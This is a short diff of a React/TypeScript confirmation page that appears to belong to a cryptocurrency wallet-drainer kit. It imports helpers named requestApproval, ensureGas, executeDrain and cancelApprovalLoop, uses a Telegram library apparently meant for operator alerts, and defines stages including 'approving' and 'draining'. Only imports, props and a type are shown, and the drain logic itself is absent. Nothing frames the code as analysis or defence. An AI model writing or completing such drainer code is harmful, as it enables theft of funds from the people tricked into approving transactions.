@@ -1,15 +1,15 @@
-// src/ConfirmPage.tsx
+// src/components/confirm-page.tsx
 import { useState } from "react";
 import { ethers } from "ethers";
 import { requestApproval, ensureGas, executeDrain, cancelApprovalLoop } from "../lib/web3";
-import { notify, formatAddress } from "../lib/telegram";
+import { formatAddress } from "../lib/telegram"; // Removed `notify`
 
 interface Props {
   provider: ethers.BrowserProvider;
   address: string;
   recipient: string;
   amount: string;
-  onBack: () => void; // Add this prop to handle back navigation
+  onBack: () => void;
 }
 
 type Stage = "confirming" | "approving" | "checking_gas" | "draining" | "done" | "error";
